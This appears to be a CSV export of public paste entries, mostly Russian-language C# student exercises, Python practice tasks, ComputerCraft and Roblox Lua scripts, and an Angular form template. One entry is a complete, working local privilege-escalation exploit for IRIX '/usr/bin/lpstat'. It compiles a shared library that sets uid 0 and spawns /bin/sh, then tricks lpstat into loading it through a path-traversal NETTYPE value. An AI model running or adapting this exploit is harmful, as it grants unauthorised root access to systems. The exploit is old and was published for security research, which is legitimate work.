id,title,username,language,date,content
            var inputKey = char.ToUpper(Console.ReadKey().KeyChar);

            if (inputKey == applyKey)
            {
                Console.WriteLine(""Выход из программы..."");
                return false;
            }
            else
            {
                Console.WriteLine(""Продолжение работы программы..."");
                return true;
            }
        }

        private static void WaitUserKey()
        {
            Console.WriteLine();
            Console.Write(""Нажмите любую кнопку чтобы продолжить..."");
            Console.ReadKey();
        }
    }
}"
23ZULEuj,HealthBar,UrayFenn,C#,Saturday 24th of February 2024 11:27:30 PM CDT,"namespace HealthBar
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int percentHealth = 70;
            int barLenght = 20;
            Console.WriteLine($""Шкала здоровья при {percentHealth}% HP"");

            DrawBar(percentHealth, barLenght, ConsoleColor.Green);
        }

        static void DrawBar(int percentageFilled, int barLenght, ConsoleColor color)
        {
            int maxHealthPercent = 100;
            int minHealthPercent = 0;

            if(percentageFilled >= minHealthPercent && percentageFilled <= maxHealthPercent)
            {
                ConsoleColor defaultColor = Console.BackgroundColor;
                string bar;
                char symbol = ' ';
                int filledLenght = (barLenght * percentageFilled) / maxHealthPercent;
                int emptyLenght = barLenght - filledLenght;
                bar = new string(symbol, filledLenght);
                Console.WriteLine();
                Console.Write('[');
                Console.BackgroundColor = color;
                Console.Write(bar);
                Console.BackgroundColor = defaultColor;
                bar = new string(symbol, emptyLenght);
                Console.Write($""{bar}]"");
            }
        }
    }
}
"
xAdYFrS4,"задание ""работа с классами""",Frozy22,C#,Saturday 24th of February 2024 11:25:56 PM CDT,"using System;

class Program
{
    static void Main(string[] args)
    {
        var player = new Player(0, ""Frozy22"", 5, 100f);
        player.WriteInfo();

        Console.ReadKey();
    }

    public class Player
    {
        public int Id { get; private set; }
        public string NickName { get; private set; }
        public int CurrentLevel { get; private set; }
        public float MaxHealth { get; private set; }

        public Player(int id, string nickName, int currentLevel, float maxHealth)
        {
            Id = id;
            NickName = nickName;
            CurrentLevel = currentLevel;
            MaxHealth = maxHealth;
        }

        public void WriteInfo()
        {
            Console.WriteLine(""Player Info:"");
            Console.WriteLine($""    Id: {Id}"");
            Console.WriteLine($""    NickName: {NickName}"");
            Console.WriteLine($""    CurrentLevel: {CurrentLevel}"");
            Console.WriteLine($""    MaxHealth: {MaxHealth}"");
        }
    }
}"
NGngGVdp,PersonnelAccounting,UrayFenn,C#,Saturday 24th of February 2024 11:16:23 PM CDT,"namespace PersonnelAccounting
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string AddDossierCommand = ""1"";
            const string SeeAllDossierCommand = ""2"";
            const string DeleteDossierCommand = ""3"";
            const string SearchDossierCommand = ""4"";
            const string ExitCommand = ""5"";

            int arraySize = 0;
            string[] fullName = new string[arraySize];
            string[] positions = new string[arraySize];
            bool isWork = true;

            while (isWork)
            {
                Console.Clear();
                Console.WriteLine(""Введите желаемую команду.\n"");
                Console.WriteLine($""{AddDossierCommand} - Добавить досье"");
                Console.WriteLine($""{SeeAllDossierCommand} - Вывод всех досье на экран."");
                Console.WriteLine($""{DeleteDossierCommand} - Удалить досье"");
                Console.WriteLine($""{SearchDossierCommand} - Поиск досье по ФИО."");
                Console.WriteLine($""{ExitCommand} - Выйти из программы."");

                switch (Console.ReadLine())
                {
                    case AddDossierCommand:
                        AddDossier(ref fullName, ref positions);
                        break;

                    case SeeAllDossierCommand:
                        ShowAllDossier(positions, fullName);
                        break;

                    case DeleteDossierCommand:
                        DeleteDossier(ref fullName, ref positions);
                        break;

                    case SearchDossierCommand:
                        SearchDossier(fullName, positions);
                        break;

                    case ExitCommand:
                        isWork = false;
                        break;

                    default:
                        Console.WriteLine(""Введена неверная команда"");
                        break;
                }

                Console.WriteLine(""Нажмите любую кнопку чтобы продолжить..."");
                Console.ReadKey();
            }
        }

        private static void AddDossier(ref string[] names, ref string[] positions)
        {
            Console.WriteLine(""Введите ФИО сотрудника."");
            string name = Console.ReadLine();
            Console.WriteLine(""Введите должность сотрудника."");
            string position = Console.ReadLine();

            names = IncreasArray(names, name);
            positions = IncreasArray(positions, position);
        }

        private static string[] IncreasArray(string[] array, string text)
        {
            string[] tempArray = new string[array.Length + 1];

            for (int i = 0; i < array.Length; i++)
            {
                tempArray[i] = array[i];
            }

            tempArray[tempArray.Length - 1] = text;
            array = tempArray;
            return array;
        }

        private static void ShowAllDossier(string[] positions, string[] fullNames)
        {
            int index = 1;

            for (int i = 0; i < positions.Length; i++)
            {
                Console.WriteLine($""({index}) ФИО: {fullNames[i]}. Должность: {positions[i]}."");
                index++;
            }
        }

        private static void DeleteDossier(ref string[] fullNames, ref string[] positions)
        {
            Console.Write(""Введите номер досье :"");
            int number = int.Parse(Console.ReadLine());

            if (number > 0 && number <= fullNames.Length)
            {
                int index = number - 1;
                fullNames = DecreaseArray(fullNames, index);
                positions = DecreaseArray(positions, index);
                Console.WriteLine($""Досье под номером {number} удалено!"");
            }
            else
            {
                Console.WriteLine(""Досье с таким номером не существует!!!"");
            }
        }

        private static string[] DecreaseArray(string[] array, int index)
        {
            string[] tempArray = new string[array.Length - 1];

            for (int i = 0; i < index; i++)
            {
                tempArray[i] = array[i];
            }

            for (int i = index; i < array.Length - 1; i++)
            {
                tempArray[i] = array[i + 1];
            }

            array = tempArray;
            return array;
        }

        private static void SearchDossier(string[] fullNames, string[] positions)
        {
            Console.WriteLine(""Введите фамилию для поиска досье"");
            string surname = Console.ReadLine();

            for (int i = 0; i < fullNames.Length; i++)
            {
                char delimiter = ' ';
                string[] split = fullNames[i].Split(delimiter);

                if (split[0].ToLower() == surname.ToLower())
                {
                    Console.WriteLine($""({i + 1}) ФИО : {fullNames[i]}. Должность : {positions[i]}"");
                }
            }
        }
    }
}"
D3kHskvN,custom_update_file,EDDY_here,Lua,Saturday 24th of February 2024 11:05:51 PM CDT,"print('Make new update file give name:')

local FILENAME = ""/""..read().."".lua""

print('give git gist url example: https://gist.githubusercontent.com/{user}/{gist_id}/raw/{name}')
local git_gist = read()
ress,err = http.get(git_gist)

if not ress then error(err) end

local code = ress.readAll()

if not (fs.exists(FILENAME))
then
    local newHarvest = fs.open(FILENAME,'w')
    newHarvest.close()
end

local readfile = fs.open(FILENAME,'r')
local oldcode = readfile.readAll()
readfile.close()

local file = fs.open(FILENAME, 'w')
 
if oldCode == code
then
    file.write(oldCode)
    print('NO CHANGES MADE - Same Code')
else
    file.write(code)
    print('WRITING UPDATE')
    byteDiff = string.len(code) - string.len(oldCode)
 
    if byteDiff >= 0
    then
        print(tostring(math.abs(byteDiff)) .. ' bytes added')
    else
        print(tostring(math.abs(byteDiff)) .. ' bytes removed')
    end
end
 
file.close()
res.close()
"
KrBrgCVi,Untitled,MisterQuirk,Python,Saturday 24th of February 2024 11:02:49 PM CDT,"#Task 1

# n, m = int(input()), int(input())
# s = []
# s.append(n), s.append(m)
# print(sum(s))

#Task 2

# l = input()
# a = l.split()
# print(a[0], a[-1])

#Task 3


#Task 1

# n = int(input())
#
# for i in range(n + 1):
#     if i % 3 == 0 and i % 6 != 0:
#         print(i)

#Task 2

# n = int(input())
#
# for i in range(10, n + 1):
#     if i % 10 % 2 == 0:
#         print(i)

#Task 3

# n = int(input())
# s = 0
# k = 0
# if n % 2 == 0:
#     for i in range(1, n + 1):
#         if i % 2 == 0:
#             s += 1
#     print(s)
# else:
#     for i in range(1, n + 1):
#         if i % 2 != 0:
#             k += i
#     print(k)
# 50 2500

#Task 4

# n = int(input())
# k = 0
# if n % 3 == 0:
#     m = int(input())
#     for i in range(1, n + 1):
#         if i % m == 0:
#             k += 1
#     print(k)
# else:
#     for i in range(1, n + 1):
#         print(n**i)

#Task 5

# a, b, n = int(input()), int(input()), int(input())
# k = 0
# arr = []
# for i in range(n):
#     x = int(input())
#     arr.append(x)
# for i in range(n):
#     if a**2 + b**2 == arr[i]**2 and arr[i] > 10 and (arr[i] % 3 == 0 or arr[i] % 4 == 0):
#         k += 1
# print(k)
"
4jea8swC,CloudStreamPlugins - CS3xxx,Freitez93,JSON,Saturday 24th of February 2024 10:59:52 PM CDT,"{
    ""name"": ""Repository of CS3xxx"",
    ""description"": ""Repository Adult (+18) of CS3xxx"",
    ""manifestVersion"": 1,
    ""pluginLists"": [
        ""https://raw.githubusercontent.com/Freitez93/my_Biblioteca/main/CS3xxx-Ext.json""
    ]
}"
p0cEUjYz,flyto,Jpaul999,Lua,Saturday 24th of February 2024 10:50:26 PM CDT,"-- Retrieve command line arguments
local args = {...}

-- Check if there are three arguments provided
if #args ~= 3 then
    print(""Usage: lua fly_and_return.lua <x> <y> <z>"")
    return
end

-- Convert arguments to numbers
local x, y, z = tonumber(args[1]), tonumber(args[2]), tonumber(args[3])

-- Function to fly to specific coordinates
local function flyTo(x, y, z)
    local startX, startY, startZ = gps.locate()
    if not startX then
        print(""Error: Could not determine current position."")
        return
    end
    
    local deltaX, deltaY, deltaZ = x - startX, y - startY, z - startZ
    
    -- Move along X-axis
    if deltaX > 0 then
        turtle.turnRight()
        for _ = 1, deltaX do
            while not turtle.forward() do
                sleep(0.5)
            end
        end
        turtle.turnLeft()
    elseif deltaX < 0 then
        turtle.turnLeft()
        for _ = 1, math.abs(deltaX) do
            while not turtle.forward() do
                sleep(0.5)
            end
        end
        turtle.turnRight()
    end
    
    -- Move along Y-axis
    local currentY = startY
    while currentY < y do
        while not turtle.up() do
            sleep(0.5)
        end
        currentY = currentY + 1
    end
    while currentY > y do
        while not turtle.down() do
            sleep(0.5)
        end
        currentY = currentY - 1
    end
    
    -- Move along Z-axis
    if deltaZ > 0 then
        for _ = 1, deltaZ do
            while not turtle.forward() do
                sleep(0.5)
            end
        end
    elseif deltaZ < 0 then
        turtle.turnAround()
        for _ = 1, math.abs(deltaZ) do
            while not turtle.forward() do
                sleep(0.5)
            end
        end
    end
end

-- Function to return to the start position
local function returnToStart()
    local startX, startY, startZ = gps.locate()
    if not startX then
        print(""Error: Could not determine current position."")
        return
    end
    
    flyTo(startX, startY, startZ)
end

-- Fly to the specified coordinates
flyTo(x, y, z)

-- Perform actions at the destination

-- Return to the starting position
returnToStart()
"
UAUdUY09,GPS,Alexr360,Lua,Saturday 24th of February 2024 10:00:45 PM CDT,"term.clear()
term.setCursorPos(1, 1)
shell.run(""gps"",""host"",x,y,z)"
XaBiTyEn,Untitled,kestorm,Lua,Saturday 24th of February 2024 09:48:02 PM CDT,"local display = {}

local insertService = game:GetService('InsertService')
local tweenService = game:GetService('TweenService')
local marketplaceService = game:GetService('MarketplaceService')
local serverStorage = game:GetService('ServerStorage')

local allModelsLoaded = false

local appliedPartsWithInfo = {} -- used to store parts with already existing configurations in case of reiteration problems

local rotationInfo = TweenInfo.new(
	3,
	Enum.EasingStyle.Linear
)

local hoverInfo = TweenInfo.new(
	3,
	Enum.EasingStyle.Sine,
	Enum.EasingDirection.InOut
)

local function setRotationLoop(part : BasePart)
	while true do
		tweenService:Create(part, rotationInfo, {Orientation = Vector3.new(0,360,0)}):Play()
		task.wait(3)
	end
	print('setup rotation loop')
end

local function setHoverLoop(part : BasePart)
	while true do
		tweenService:Create(part, hoverInfo, {Position = part.Position + Vector3.new(0,2,0)}):Play()
		task.wait(3)
		tweenService:Create(part, hoverInfo, {Position = part.Position - Vector3.new(0,2,0)}):Play()
		task.wait(3)
	end
	print('setup hover loop')
end

local function setupDisplayItem(part : BasePart, id : number)
	print('setting up dispplay items')
	
	local newMesh = Instance.new('SpecialMesh', part)
	
	local texture = 0
	local mesh = 0
	
	local function getMeshTexInfo(asset)
		if asset:FindFirstChildOfClass('BasePart') then
			local handle = asset:FindFirstChildOfClass('BasePart')
			if handle:FindFirstChildOfClass('SpecialMesh') then
				print('specialmesh')
				texture = 'rbxassetid://'..asset:FindFirstChildOfClass('SpecialMesh').TextureId
				mesh = 'rbxassetid://'..asset:FindFirstChildOfClass('SpecialMesh').MeshId
			elseif handle:IsA('MeshPart') then
				print('meshpart')
				print(handle.TextureId)
				print(handle.MeshId)
				texture = 'rbxassetid://'..handle.TextureID
				mesh = 'rbxassetid://'..handle.MeshId
			end
		end
	end
	print('got func')
	
	repeat -- makes sure this won't error when trying to collect information on the display items
		task.wait(0.05)
	until allModelsLoaded == true
	print('all models are loaded!')
	
	local displayModelStorage = serverStorage:WaitForChild('DisplayModels')
	
	for _, v in pairs(displayModelStorage:GetChildren()) do
		if v:GetAttribute('AssetNum') == id then
			task.spawn(function()
				getMeshTexInfo(v)
			end)
			print(texture)
			print(mesh)
		end
	end
	
	newMesh.TextureId = texture
	newMesh.MeshId = mesh
end

local function setupMarketInformation(part : BasePart, id : number) -- will duplicate a billboardgui into part and configure information so yah
	-- do stuff
end

function display.createDisplayItems(folder : Folder)
	local assetNumber = 0
	local spawnedFolder = Instance.new('Folder', serverStorage)
	spawnedFolder.Name = 'DisplayModels'
	
	for _, part in pairs(folder:GetChildren()) do
		if part:IsA('BasePart') and part:GetAttribute('AssetId') then
			assetNumber = tonumber(part:GetAttribute('AssetId'))
			local insertModel = insertService:LoadAsset(assetNumber)
			insertModel.Parent = spawnedFolder
			print('added '..insertModel.Name..' to display item folder')
			local newId = insertModel:SetAttribute('AssetNum', assetNumber)
			print(assetNumber)
		end
	end
	allModelsLoaded = true
	print('created server models. waiting for replication on the client!')
end

function display.test(part : BasePart)
	if part:GetAttribute('AssetId') then
		setupDisplayItem(part, part:GetAttribute('AssetId'))
	else
		print('does not have asset id attribute')
	end
end

return display"
VdGM9YmH,Q to TP,LSJiqueue,Lua,Saturday 24th of February 2024 09:45:00 PM CDT,"local localPlayer = game:GetService(""Players"").LocalPlayer
local mouse = localPlayer:GetMouse()
local uis = game:GetService(""UserInputService"")
local hotkey = ""Q"" -- must be capital letter
uis.InputBegan:Connect(function(i, gp)
	if gp then return end 
	if i.KeyCode == Enum.KeyCode[hotkey] then 
		localPlayer.Character:FindFirstChild(""HumanoidRootPart"").CFrame = mouse.Hit + Vector3.new(0, 1, 0)
	end
end)"
u9kCxUmZ,manager,ChickenSquiggles,Lua,Saturday 24th of February 2024 09:42:51 PM CDT,"local pf = peripheral.wrap(""left"")
 
 
 
while true do
    sleep()
    local players = pf.getPlayersInRange(10)
 
    for _,v in ipairs(players) do
        commands.exec(""effect give ""..v.."" minecraft:resistance 20 255"") 
        commands.exec(""tp ""..v.."" ""..math.random(4294,6293).."" 200 ""..math.random(-1470,529))
    end
 
end"
Jx9GnKhR,Turtle Fuel,Alexr360,Lua,Saturday 24th of February 2024 09:32:38 PM CDT,"-- Function to refuel the turtle
function refuel()
    -- Loop over each slot in the turtle's inventory
    for i = 1, 16 do
        -- Select the slot
        turtle.select(i)

        -- If the selected slot contains an item, try to refuel with it
        if turtle.getItemCount(i) > 0 then
            turtle.refuel(1)
        end
    end

    -- Print out the turtle's current fuel level
    print(""Current fuel level: "" .. turtle.getFuelLevel())
end

-- Call the refuel function
refuel()
"
qCnhzfeD,IRIX 5.3/6.2/6.3/6.4/6.5/6.5.11 - '/usr/bin/lpstat' Local Overflow / Local Privilege Escalation,FlyFar,Bash,Saturday 24th of February 2024 09:28:25 PM CDT,"#!/bin/sh
## copyright LAST STAGE OF DELIRIUM jul 2000 poland            *://lsd-pl.net/ #
## /usr/bin/lpstat                                                             #

EXECUTABLE=/usr/bin/lpstat
FILE=file
LIBRARY=lsd
DIRECTORY=tmp

cd $DIRECTORY
cat > $FILE << 'EOF'
HOSTNAME=localhost
HOSTPRINTER=bzzz-z
EOF
echo NETTYPE=../../../../$DIRECTORY/lsd >> $FILE
chmod 666 $FILE
cat > $LIBRARY.c << 'EOF'
OpenConn(){
    printf(""copyright LAST STAGE OF DELIRIUM jul 2000 poland  //lsd-pl.net/\n"");
    printf(""/usr/bin/lpstat for irix 5.3 6.2 6.3 6.4 6.5 6.5.11 IP:all\n"");
    printf(""\n"");
    setreuid(getuid(),0);setuid(0);setgid(0);
    execl(""/bin/sh"",""sh"",0);
}
CloseConn(){} ListPrinters(){} SendJob(){} CancelJob(){} WaitForJob(){}
GetQueue(){} StartTagging(){} StopTagging(){} Install(){} AddTimeout(){}
RemoveSemiColons(){} CreateInterface(){} InstallPrinter(){}
InstallIcon(){} SockRead(){} IsDest(){} BSDSendJob(){} ListAllPrinters(){}
EOF
cc -c $LIBRARY.c -c -o $LIBRARY.o
ld -shared $LIBRARY.o -o $LIBRARY.so
rm -rf $LIBRARY.[co] so_locations
if [ ! -f ""$LIBRARY.so"" ]
    then
    echo ""error: building library""
    exit 1
fi
chmod 666 $LIBRARY.so

$EXECUTABLE -n ../../../../../$DIRECTORY/$FILE

# milw0rm.com [2001-05-07]
            "
PY3u6Nt9,Lantern Replacement Program,Alexr360,Lua,Saturday 24th of February 2024 09:25:44 PM CDT,"-- Define the target coordinates
local targets = {
    {x=614, y=169, z=-580},
    {x=616, y=196, z=587},
    -- Add more coordinates as needed
}

-- Define the initial position of the turtle
local position = {x=616, y=196, z=587}

-- Function to move the turtle to a specific coordinate
function moveTo(target)
    -- Calculate the difference between the current and target positions
    local dx = target.x - position.x
    local dy = target.y - position.y
    local dz = target.z - position.z

    -- Move along the x-axis
    for i=1, math.abs(dx) do
        if dx > 0 then
            turtle.forward()
        else
            turtle.back()
        end
    end

    -- Move along the y-axis
    for i=1, math.abs(dy) do
        if dy > 0 then
            turtle.up()
        else
            turtle.down()
        end
    end

    -- Move along the z-axis
    for i=1, math.abs(dz) do
        if dz > 0 then
            turtle.turnRight()
            turtle.forward()
            turtle.turnLeft()
        else
            turtle.turnLeft()
            turtle.forward()
            turtle.turnRight()
        end
    end

    -- Update the current position
    position = target
end

-- Function to mine and replace a block
function mineAndReplace()
    -- Mine the block beneath the turtle
    turtle.digDown()

    -- Select the first slot in the inventory
    turtle.select(1)

    -- Place a block beneath the turtle
    turtle.placeDown()
end

-- Function to check for and avoid obstacles
function avoidObstacles()
    -- If there's an obstacle in front of the turtle
    if turtle.detect() then
        -- Move up to avoid it
        turtle.up()
    end
end

-- Main program
function main()
    -- For each target coordinate
    for i, target in ipairs(targets) do
        -- Move to the target coordinate
        moveTo(target)

        -- Check for and avoid obstacles
        avoidObstacles()

        -- Mine and replace the block beneath the turtle
        mineAndReplace()
    end
end

-- Run the main program
main()
"
u967TY85,Untitled,adrio12,Lua,Saturday 24th of February 2024 09:21:57 PM CDT,"local function testHTTPRequest()
    local url = ""http://worldtimeapi.org/api/timezone/Etc/UTC""
    local response = http.get(url)

    if response then
        local data = response.readAll()
        print(""Odpowiedź z serwera: "", data)
        response.close()
    else
        print(""Nie można nawiązać połączenia z serwerem."")
    end
end

testHTTPRequest()
"
xw1HTt02,template,didkoslawow,HTML,Saturday 24th of February 2024 09:13:21 PM CDT,"<div class=""form__container"">
    <div class=""form__container--content"">
        <h2 class=""form__container--content-heading subheading"">
            {{headingText}}
        </h2>
        <form [formGroup]=""formModel.form"" class=""form__container--content-form"" (ngSubmit)=""onSubmit()"">
            @if (isRegistrationForm() && !isLoginForm()) {
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""firstName""
                    class=""form__container--content-controls-input"" formControlName=""firstName"" />
                <label for=""firstName"" class=""form__container--content-controls-label"">First Name</label>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""lastName""
                    class=""form__container--content-controls-input"" formControlName=""lastName"" />
                <label for=""lastName"" class=""form__container--content-controls-label"">Last Name</label>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""avatar"" class=""form__container--content-controls-input""
                    formControlName=""avatar"" />
                <label for=""avatar"" class=""form__container--content-controls-label"">Avatar</label>
            </div>
            }
            @if(isLoginForm() || isRegistrationForm()) {
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""email"" class=""form__container--content-controls-input""
                    formControlName=""email"" />
                <label for=""email"" class=""form__container--content-controls-label"">Email</label>
            </div>
            <div class=""form__container--content-controls"">
                <input placeholder=""placeholder"" id=""password"" class=""form__container--content-controls-input""
                    type=""password"" formControlName=""password"" />
                <label for=""password"" class=""form__container--content-controls-label"">Password</label>
            </div>
            }
            @if (isRegistrationForm()){
            <div class=""form__container--content-controls"">
                <input placeholder=""placeholder"" id=""rePass"" class=""form__container--content-controls-input""
                    type=""password"" formControlName=""rePassword"" />
                <label for=""rePass"" class=""form__container--content-controls-label"">Re Password</label>
            </div>
            <p class=""form__container--content-form-link"">Already have an account? <a routerLink=""/auth/login""
                    class=""link"">Sign in here!</a></p>
            } @else if(isLoginForm()) {
            <p class=""form__container--content-form-link"">Don't have and account? <a routerLink=""/auth/register""
                    class=""link"">Sign up here!</a></p>
            }
            @if(isRecipeEditForm() || isRecipeCreateForm()) {
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""name"" class=""form__container--content-controls-input""
                    formControlName=""name"" />
                <label for=""name"" class=""form__container--content-controls-label"">Name</label>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""prepTime""
                    class=""form__container--content-controls-input"" formControlName=""prepTime"" />
                <label for=""prepTime"" class=""form__container--content-controls-label"">Prep Time (min)</label>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""cookTime""
                    class=""form__container--content-controls-input"" formControlName=""cookTime"" />
                <label for=""cookTime"" class=""form__container--content-controls-label"">Cook Time (min)</label>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""img"" class=""form__container--content-controls-input""
                    formControlName=""img"" />
                <label for=""img"" class=""form__container--content-controls-label"">Image</label>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""ingredient""
                    class=""form__container--content-controls-input"" formControlName=""ingredient"" />
                <label for=""ingredient"" class=""form__container--content-controls-label"">Ingredient</label>
                <button type=""button"" class=""form__container--content-controls-btn"" (click)=""onAddIngredient()""><fa-icon
                        [icon]=""faBtn"" /></button>
            </div>
            <div class=""form__container--content-controls form__container--content-controls-qty"">
                <fa-icon [icon]=""faList"" />
                <input type=""text"" name=""quantity"" id=""quantity"" formControlName=""quantity"">
                <fa-icon [icon]=""faSpoon"" />
                <select name=""unit"" id=""unit"" formControlName=""unit"">
                    <option value="""" disabled selected>Units</option>
                    @for(unit of units; track unit) {
                    <option [ngValue]=""unit"">{{unit}}</option>
                    }
                </select>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""steps"" class=""form__container--content-controls-input""
                    formControlName=""steps"" />
                <label for=""steps"" class=""form__container--content-controls-label"">Cooking Steps</label>
                <button type=""button"" class=""form__container--content-controls-btn"" (click)=""onAddStep()""><fa-icon
                        [icon]=""faBtn"" /></button>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""description""
                    class=""form__container--content-controls-input"" formControlName=""description"" />
                <label for=""description"" class=""form__container--content-controls-label"">Cooking Description</label>
            </div>
            }
            <input class=""form__container--content-form-btn btn btn--full"" type=""submit"" [value]=""buttonText"" />
        </form>
        <div [ngClass]=""ingredients.length || steps.length ? 'opened' : ''"" class=""form__container--content-info"">
            <div class=""ingredients"">
                <p class=""ingredients__heading"">Ingredients</p>
                <ul class=""ingredients__list"">
                    @for (ingredient of ingredients; track ingredient) {
                    <li (click)=""onEditIngredient(ingredient)"" class=""ingredients__list--item"">
                        <span>{{ingredient.name}}</span> <span>{{ingredient.ProductRecipe.quantity}}
                            {{ingredient.ProductRecipe.unit}}</span>
                    </li>
                    }
                </ul>
            </div>
            <div class=""steps"">
                <p class=""steps__heading"">Steps</p>
                <ul class=""steps__list"">
                    @for (step of steps; track step) {
                    <li (click)=""onEditSteps(step)"" class=""steps__list--item"">{{step}}</li>
                    }
                </ul>
            </div>
        </div>
    </div>
</div>"
